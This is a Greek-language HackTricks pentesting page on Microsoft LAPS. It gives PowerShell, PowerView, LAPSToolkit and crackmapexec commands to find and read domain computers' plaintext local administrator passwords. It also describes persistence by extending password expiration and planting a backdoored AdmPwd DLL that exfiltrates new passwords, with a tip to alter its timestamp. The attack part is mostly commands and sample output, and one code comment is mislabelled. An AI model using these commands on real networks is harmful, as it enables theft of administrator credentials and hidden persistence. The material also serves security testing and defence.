# LAPS

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team AWS του HackTricks)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Βασικές Πληροφορίες

Η Λύση Τοπικού Διαχειριστή Κωδικού (LAPS) είναι ένα εργαλείο που χρησιμοποιείται για τη διαχείριση ενός συστήματος όπου οι **κωδικοί διαχειριστή**, οι οποίοι είναι **μοναδικοί, τυχαίοι και τακτικά αλλάζονται**, εφαρμόζονται σε υπολογιστές που έχουν ενταχθεί στον τομέα. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια εντός του Active Directory και είναι προσβάσιμοι μόνο από χρήστες που έχουν δοθεί άδεια μέσω Λιστών Ελέγχου Πρόσβασης (ACLs). Η ασφάλεια των μεταδόσεων κωδικών από τον πελάτη στον διακομιστή διασφαλίζεται με τη χρήση του **Kerberos έκδοση 5** και του **Προηγμένου Προτύπου Κρυπτογράφησης (AES)**.

Στα αντικείμενα υπολογιστών του τομέα, η εφαρμογή της LAPS οδηγεί στην προσθήκη δύο νέων χαρακτηριστικών: **`ms-mcs-AdmPwd`** και **`ms-mcs-AdmPwdExpirationTime`**. Αυτά τα χαρακτηριστικά αποθηκεύουν τον **κωδικό διαχειριστή κειμένου** και **τον χρόνο λήξης του**, αντίστοιχα.

### Έλεγχος εάν είναι ενεργοποιημένο
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Πρόσβαση στον κωδικό πρόσβασης του LAPS

Μπορείτε να **κατεβάσετε τη ρυθμιση LAPS** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και στη συνέχεια να χρησιμοποιήσετε το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψετε αυτό το αρχείο σε μορφή αναγνώσιμη από ανθρώπους.

Επιπλέον, τα **ενσωματωμένα LAPS PowerShell cmdlets** μπορούν να χρησιμοποιηθούν αν είναι εγκατεστημένα σε έναν υπολογιστή στον οποίο έχουμε πρόσβαση:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** μπορεί επίσης να χρησιμοποιηθεί για να ανακαλύψει **ποιος μπορεί να διαβάσει τον κωδικό και να τον διαβάσει**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### Εργαλείο LAPSToolkit

Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την απαρίθμηση των LAPS με διάφορες λειτουργίες.\
Ένα από αυτά είναι η ανάλυση των **`ExtendedRights`** για **όλους τους υπολογιστές με ενεργοποιημένα τα LAPS.** Αυτό θα εμφανίσει **ομάδες** που είναι ειδικά **αναθετημένες να διαβάζουν τους κωδικούς LAPS**, οι οποίες συχνά είναι χρήστες σε προστατευμένες ομάδες.\
Ένα **λογαριασμός** που έχει **ενταχθεί σε έναν υπολογιστή** σε έναν τομέα λαμβάνει `Όλα τα Επεκτεινόμενα Δικαιώματα` πάνω σε αυτό τον υπολογιστή, και αυτό το δικαίωμα δίνει στον **λογαριασμό** τη δυνατότητα να **διαβάζει κωδικούς πρόσβασης**. Η απαρίθμηση μπορεί να δείξει έναν λογαριασμό χρήστη που μπορεί να διαβάσει τον κωδικό LAPS σε έναν υπολογιστή. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους χρήστες του AD** που μπορούν να διαβάσουν τους κωδικούς LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Απορρόφηση Κωδικών LAPS με το Crackmapexec**
Εάν δεν υπάρχει πρόσβαση σε ένα powershell μπορείτε να καταχραστείτε αυτό το προνόμιο απομακρυσμένα μέσω LDAP χρησιμοποιώντας
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **Μέθοδος Μόνιμης Επιμονής LAPS**

### **Ημερομηνία Λήξης**

Αφού γίνετε διαχειριστής, είναι δυνατόν να **αποκτήσετε τους κωδικούς πρόσβασης** και να **εμποδίσετε** ένα μηχάνημα από το **να ενημερώνει** τον **κωδικό πρόσβασής του** με το **να ορίζετε την ημερομηνία λήξης στο μέλλον**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Ο κωδικός θα επαναφερθεί ακόμα και αν ένας **διαχειριστής** χρησιμοποιήσει το **`Reset-AdmPwdPassword`** cmdlet; ή αν η επιλογή **Do not allow password expiration time longer than required by policy** είναι ενεργοποιημένη στο LAPS GPO.
{% endhint %}

### Πίσω πόρτα

Ο πρωτογενής κώδικας για το LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατόν να τοποθετηθεί μια πίσω πόρτα στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο αρχείο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που θα **εξαγάγει νέους κωδικούς ή θα τους αποθηκεύσει κάπου**.

Στη συνέχεια, απλά μεταγλωττίστε το νέο `AdmPwd.PS.dll` και ανεβάστε το στο μηχάνημα στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και αλλάξτε την χρονοσήμανση τροποποίησης).

## Αναφορές
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
